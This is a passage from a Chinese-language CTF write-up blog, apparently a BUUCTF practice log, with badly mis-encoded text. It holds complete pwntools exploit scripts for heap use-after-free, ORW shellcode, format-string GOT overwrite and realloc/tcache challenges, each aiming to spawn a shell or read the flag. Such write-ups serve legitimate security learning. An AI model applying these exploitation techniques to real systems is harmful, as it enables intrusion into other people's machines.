punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x31'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>åˆ©ç”¨<strong>uaf</strong>æ¼æ´ï¼Œé€ æˆå †å—é‡å ï¼Œä½¿æˆ‘ä»¬å¯ä»¥æ§åˆ¶0x20å¤§å°çš„chunkä¸­çš„æŒ‡é’ˆï¼Œå°†æŒ‡é’ˆæ”¹ä¸º<strong>free_hook</strong>çš„åœ°å€å³å¯ï¼Œç„¶ååˆ©ç”¨editä¿®æ”¹ä¸º<strong>system</strong></p><h2 id="0x3-æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad"><a href="#0x3-æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad" class="headerlink" title="0x3.[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad"></a>0x3.[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad</h2><p>è¿™é¢˜æ²¡æœ‰ä»»ä½•ä¿æŠ¤ï¼Œå­˜åœ¨æ²™ç®±ï¼Œæ— æ³•getshellï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨<strong>orw</strong>æ”»å‡»è¯»å–flag</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/8.jpg" alt=""></p><p>ç¨‹åºåœ¨<strong>0x123000</strong>å¤„å¼€è¾Ÿäº†ä¸€å—å†…å­˜</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/9.jpg" alt=""></p><p>è€ƒè™‘é¦–å…ˆåœ¨æ ˆä¸­åˆ©ç”¨shellcodeå¾€<strong>0x123000</strong>å¤„å†™å…¥orwçš„shellcodeï¼Œç„¶åè°ƒç”¨0x123000å¤„çš„shellcodeå³å¯ï¼Œexpå¦‚ä¸‹:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepcontext<span class="token punctuation">.</span>binary<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./bad'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./bad')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28529</span><span class="token punctuation">)</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x400a01</span>orw_payload <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>orw_payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123100</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x123000</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> \    asm<span class="token punctuation">(</span><span class="token string">'mov rax,0x123000;call rax'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;jmp rsp'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'have fun!'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>orw_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x4-axb-2019-fmt64"><a href="#0x4-axb-2019-fmt64" class="headerlink" title="0x4.axb_2019_fmt64"></a>0x4.axb_2019_fmt64</h2><p>ç¨‹åºæ— é™å¾ªç¯ï¼Œgotè¡¨å¯å†™</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/10.jpg" alt=""></p><p>é¦–å…ˆæ³„éœ²libcåœ°å€ï¼Œç„¶åå°†<strong>printf</strong>çš„<strong>got</strong>è¡¨å€¼ä¿®æ”¹ä¸º<strong>system</strong>çš„åœ°å€ï¼Œè¾“å…¥<strong>/bin/sh</strong>å³å¯getshell.expå¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io = process('./axb_2019_fmt64')</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26696</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./axb_2019_fmt64'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'lock'</span> <span class="token operator">+</span> <span class="token string">'%9$s'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>offset0 <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>offset1 <span class="token operator">=</span> system_addr <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset0 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset0<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offset1 => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>offset1<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">';/bin/sh'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ç”±äºprintfçš„åœ°å€å’Œsystemçš„åœ°å€åªæœ‰å5ä½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹åä¸‰ä¸ªå­—èŠ‚å³å¯ï¼Œä¸è¿‡è¿™é‡Œæˆ‘ä»¬ä¾ç„¶ä¿®æ”¹åå››ä¸ªå­—èŠ‚ï¼Œ</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset0<span class="token number">-9</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%12$hn'</span></code></pre><p>è¿™ä¸€å¥æ˜¯ä¿®æ”¹åä¸¤ä¸ªå­—èŠ‚ï¼Œ-9æ˜¯å› ä¸ºå‰é¢è¿˜ä¼šè¾“å‡º<strong>Repeater:</strong>ï¼Œå³å·²ç»è¾“å‡ºäº†9ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‡å»9</p><pre class=" language-python"><code class="language-python"><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset1<span class="token operator">-</span>offset0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%13$hn'</span></code></pre><p>è¿™ä¸€å¥åˆ™æ˜¯ä¿®æ”¹å€’æ•°ç¬¬ä¸‰å’Œç¬¬å››ä¸ªå­—èŠ‚ï¼Œç”±äºå·²ç»è¾“å‡ºäº†<strong>offset0</strong>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦å‡å»<strong>offset0</strong></p><p>å‰©ä¸‹çš„payloadå°±æ˜¯å…«å­—èŠ‚å¯¹é½ï¼ŒæŠŠprintfå’Œprintf+2æ”¾åœ¨å¯¹åº”çš„ä½ç½®ä¸Š</p><h2 id="0x5-roarctf-2019-realloc-magic"><a href="#0x5-roarctf-2019-realloc-magic" class="headerlink" title="0x5.roarctf_2019_realloc_magic"></a>0x5.roarctf_2019_realloc_magic</h2><p>è¿™é¢˜è€ƒç‚¹åœ¨äºreallocï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">realloc</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token punctuation">[</span>size_t<span class="token punctuation">]</span>new_size <span class="token punctuation">)</span></code></pre><p><strong>ptr</strong> ä¸ºéœ€è¦é‡æ–°åˆ†é…çš„å†…å­˜ç©ºé—´æŒ‡é’ˆï¼Œ<strong>new_size</strong>ä¸ºæ–°çš„å†…å­˜ç©ºé—´çš„å¤§å°</p><p>å…·ä½“ç”¨æ³•ä¸º</p><blockquote><p>size == 0 ï¼Œé€™å€‹æ™‚å€™ç­‰åŒæ–¼free<br>realloc_ptr == 0 &amp;&amp; size &gt; 0 ï¼Œ é€™å€‹æ™‚å€™ç­‰åŒæ–¼malloc<br>malloc_usable_size(realloc_ptr) &gt;= sizeï¼Œ é€™å€‹æ™‚å€™ç­‰åŒæ–¼edit<br>malloc_usable_size(realloc_ptr) &lt; szieï¼Œ é€™å€‹æ™‚å€™æ‰æ˜¯mallocä¸€å¡Šæ›´å¤§çš„è¨˜æ†¶é«”ï¼Œå°‡åŸä¾†çš„å…§å®¹è¤‡è£½éå»ï¼Œå†å°‡åŸä¾†çš„chunkçµ¦freeæ‰</p></blockquote><p>å³ï¼Œæ ¹æ®ptrå’Œsizeå€¼çš„ä¸åŒï¼Œreallocå°†æœ‰freeï¼Œmallocï¼Œeditå’Œextendå››ç§åŠŸèƒ½å†å›åˆ°é¢˜ç›®æ¥</p><p>ç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/11.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/12.jpg" alt=""></p><p>reåŠŸèƒ½å°±æ˜¯é€šè¿‡reallocåˆ†é…chunk</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/13.jpg" alt=""></p><p>fråŠŸèƒ½å°±æ˜¯freeæ‰å½“å‰æŒ‡é’ˆæŒ‡å‘çš„chunkï¼Œå­˜åœ¨uafæ¼æ´</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/14.jpg" alt=""></p><p>baåŠŸèƒ½å°±æ˜¯å°†æŒ‡é’ˆæ¸…é›¶ï¼Œåªèƒ½ä½¿ç”¨ä¸€æ¬¡</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/15.jpg" alt=""></p><p>ç”±äºç¨‹åºç¼ºå°‘showåŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ”¹stdoutæ¥æ³„éœ²åœ°å€ï¼Œexpå¦‚ä¸‹</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true">#!coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">realloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content?'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># fill tcache</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># to unsortbin fd->arena</span>    realloc<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x180</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># overlap</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get _IO_2_1_stdout_  ä¿®æ”¹flagå’Œwrite_base</span>    realloc<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get_libc</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>                    <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3e82a0</span>      <span class="token keyword">if</span> libc_base <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">0x3e82a0</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f322</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"free_hook => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"one_gadget => {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'666'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>free<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x260</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x128</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(io)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    realloc<span class="token punctuation">(</span><span class="token number">0x130</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 29807)</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_realloc_magic'</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x6-ciscn-2019-final-5"><a href="#0x6-ciscn-2019-final-5" class="headerlink" title="0x6.ciscn_2019_final_5"></a>0x6.ciscn_2019_final_5</h2><p>è¿™é¢˜çš„æ´å¾ˆä¸å¥½æ‰¾ï¼Œ<del>è¿˜æ˜¯å› ä¸ºæˆ‘å¤ªèœäº†</del>ï¼Œé¦–å…ˆæ£€æŸ¥ç¨‹åºä¿æŠ¤æœºåˆ¶</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/16.jpg" alt=""></p><p>gotè¡¨å¯å†™ï¼Œæ— PIE</p><p>å…±æœ‰å¢åˆ æ”¹ä¸‰ä¸ªåŠŸèƒ½</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/17.jpg" alt=""></p><p>æ¼æ´ç‚¹å­˜åœ¨äºaddåŠŸèƒ½ä¸­</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/18.jpg" alt=""></p><p>sub_400AB0å‡½æ•°åŠŸèƒ½å¦‚ä¸‹</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/19.jpg" alt=""></p><p>è¿”å›ä¸¤ä¸ªä¸¤ä¸ªå‚æ•°æŒ‰ä½æˆ–ä¹‹åçš„å€¼ï¼Œç„¶åå°†è¿™ä¸ªå€¼å­˜å…¥<strong>0x6020e0</strong>ä¸­ï¼Œ<strong>0x6020e0</strong>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¹¶ä¸”ï¼Œè¿™ä¸ªç¨‹åºä¸­å­˜å‚¨chunkçš„åœ°å€ä¸æ˜¯æŒ‰ç…§æˆ‘ä»¬è¾“å…¥çš„åºå·æ¥å­˜çš„ï¼Œè€Œæ˜¯ä»å¤´éå†æ•°ç»„ï¼Œä¾æ¬¡å­˜å…¥åœ°å€</p><p>å½“æˆ‘ä»¬åˆ†é…ç¬¬ä¸€ä¸ªchunkä¸”è¾“å…¥åºå·ä¸º16æ—¶ï¼Œè¿”å›æŒ‡é’ˆçš„åä¸‰ä½æ˜¯0x260ï¼Œç„¶å0x260|16=0x270ï¼Œæœ€ç»ˆå­˜å…¥æ•°ç»„ä¸­çš„åœ°å€çš„åä¸‰ä½ä¸º0x270ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨0x270å¤„ä¼ªé€ ä¸€ä¸ªchunkå¤´ï¼Œé€ æˆchunkoverlap</p><p>ç„¶åï¼Œè¿™é¢˜æœ‰ä¸€ç‚¹å¾ˆğŸ•ï¼Œå°±æ˜¯åœ¨editåŠŸèƒ½ä¸­</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/20.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/21.jpg" 